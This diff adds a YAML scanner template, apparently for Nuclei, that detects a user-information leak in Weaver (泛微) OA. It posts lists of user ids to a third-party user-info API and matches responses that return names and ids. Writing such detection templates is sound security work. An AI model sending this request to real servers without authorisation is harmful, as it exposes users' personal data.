@@ -1,0 +1,53 @@
+id: poc-yaml-weaver-oa-3rduserinfo-username-leak
+info:
+  name: "泛微OA 用户 3rduserinfo name 信息泄露漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        POST /api/wps/doccenter/outter/v1/3rd/user/info HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+        "ids":[1,22,4,5,6,7,8]
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"name\":"
+          - "\"id\":"
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - raw:
+      - |
+        POST /api/wps/doccenter/outter/v1/3rd/user/info HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+        "ids":[]
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"name\":"
+          - "\"id\":"
+          - "<"
+        part: body
+        negative: true
